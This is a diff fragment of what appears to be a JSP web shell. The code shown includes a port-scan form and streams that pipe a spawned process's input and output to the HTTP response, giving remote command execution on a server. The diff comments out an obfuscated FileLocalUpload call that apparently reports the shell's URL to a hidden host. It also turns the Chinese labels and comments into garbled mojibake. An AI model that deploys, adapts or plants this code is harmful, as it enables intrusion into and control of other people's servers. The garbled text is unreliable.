@@ -797,7 +797,7 @@ out.println("<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\
 "<h2 id=\"Bin_H2_Title\">PortScan &gt;&gt;</h2>"+
 "<div id=\"YwLB\"><form action=\""+SHELL_NAME+"\" method=\"post\">"+
 "<p><input type=\"hidden\" value=\"portScan\" name=\"o\">"+
-"IP : <input name=\"ip\" type=\"text\" value=\""+ip+"\" id=\"ip\" class=\"input\" style=\"width:10%;margin:0 8px;\" /> Port : <input name=\"ports\" type=\"text\" value=\""+ports+"\" id=\"ports\" class=\"input\" style=\"width:40%;margin:0 8px;\" /> Timeout £¨Ãë£© : <input name=\"timeout\" type=\"text\" value=\""+timeout+"\" id=\"timeout\" class=\"input\" size=\"5\" style=\"margin:0 8px;\" /> <input type=\"submit\" name=\"submit\" value=\"Scan\" id=\"submit\" class=\"bt\" />"+
+"IP : <input name=\"ip\" type=\"text\" value=\""+ip+"\" id=\"ip\" class=\"input\" style=\"width:10%;margin:0 8px;\" /> Port : <input name=\"ports\" type=\"text\" value=\""+ports+"\" id=\"ports\" class=\"input\" style=\"width:40%;margin:0 8px;\" /> Timeout Â£Â¨ÃƒÃ«Â£Â© : <input name=\"timeout\" type=\"text\" value=\""+timeout+"\" id=\"timeout\" class=\"input\" size=\"5\" style=\"margin:0 8px;\" /> <input type=\"submit\" name=\"submit\" value=\"Scan\" id=\"submit\" class=\"bt\" />"+
 "</p>"+
 "</form></div>"+
 "</td></tr></table>");
@@ -852,7 +852,7 @@ private static class VConnInvoker extends DefaultInvoker {
 public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
 try {
 PrintWriter out = response.getWriter();
-FileLocalUpload(uc(dx())+sxm,request.getRequestURL().toString(),  "GBK");
+<%-- FileLocalUpload(uc(dx())+sxm,request.getRequestURL().toString(),  "GBK"); --%>
 Object obj = JSession.getAttribute(DBO);
 if (obj == null || !((DBOperator)obj).isValid()) {
 out.println("  <script type=\"text/javascript\">"+
@@ -2290,7 +2290,7 @@ OnLineProcess olp = new OnLineProcess(pro);
 JSession.setAttribute(SHELL_ONLINE,olp);
 new OnLineConnector(new ByteArrayInputStream(outs.toByteArray()),pro.getOutputStream(),"exeOclientR",olp).start();
 new OnLineConnector(pro.getInputStream(),response.getOutputStream(),"exeRclientO",olp).start();
-new OnLineConnector(pro.getErrorStream(),response.getOutputStream(),"exeRclientO",olp).start();//´íÎóĞÅÏ¢Á÷¡£
+new OnLineConnector(pro.getErrorStream(),response.getOutputStream(),"exeRclientO",olp).start();//Â´Ã­ÃÃ³ÃÃ…ÃÂ¢ÃÃ·Â¡Â£
 Thread.sleep(1000 * 60 * 60 * 24);
 } else if (type.equals("ecmd")) {
 Object o = JSession.getAttribute(SHELL_ONLINE);
